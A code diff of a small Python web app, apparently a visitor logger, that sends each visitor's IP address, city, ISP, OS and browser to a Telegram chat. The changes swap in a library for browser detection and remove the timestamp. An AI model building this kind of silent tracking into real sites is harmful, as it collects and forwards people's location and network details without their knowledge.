@@ -6,6 +6,7 @@ import requests
 import os
 import time
 import uuid
+import httpagentparser
 
 # === Загружаем .env ===
 load_dotenv()
@@ -32,7 +33,7 @@ def send_telegram_message(text: str):
     except Exception as e:
         print(f"Ошибка при отправке в Telegram: {e}")
 
-# === Детектор ОС ===
+# === Детектор ОС (новый, короткие категории) ===
 def detect_os(user_agent: str):
     ua = user_agent.lower()
 
@@ -46,36 +47,6 @@ def detect_os(user_agent: str):
         return "iOS"
     if "linux" in ua and "android" not in ua:
         return "Linux"
-
-    return "Unknown"
-
-# === Полный детектор браузера ===
-def detect_browser(user_agent: str):
-    ua = user_agent.lower()
-
-    # Порядок важен!
-    if "opr/" in ua or "opera" in ua:
-        return "Opera"
-    if "edg/" in ua:
-        return "Microsoft Edge"
-    if "brave" in ua:
-        return "Brave"
-    if "vivaldi" in ua:
-        return "Vivaldi"
-    if "yabrowser" in ua:
-        return "Yandex Browser"
-    if "samsungbrowser" in ua:
-        return "Samsung Internet"
-    if "chrome" in ua and "chromium" not in ua and "edg" not in ua:
-        return "Google Chrome"
-    if "chromium" in ua:
-        return "Chromium"
-    if "firefox" in ua:
-        return "Mozilla Firefox"
-    if "safari" in ua and "chrome" not in ua:
-        return "Safari"
-    if "msie" in ua or "trident" in ua:
-        return "Internet Explorer"
 
     return "Unknown"
 
@@ -113,12 +84,15 @@ def log_visitor():
         except Exception:
             pass
 
-        # Используем наш детектор
+        # Определение ОС
         os_name = detect_os(user_agent)
-        browser_name = detect_browser(user_agent)
 
+        # Определение браузера (как раньше!)
+        parsed = httpagentparser.simple_detect(user_agent)
+        browser_name = parsed[1] if parsed and parsed[1] else "Неизвестно"
+
+        # Формирование Telegram-сообщения (время УДАЛЕНО)
         message = (
-            f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
             f"📡 IP: {ip}\n"
             f"🏙️ Город: {city}\n"
             f"🛜 Провайдер: {isp}\n"
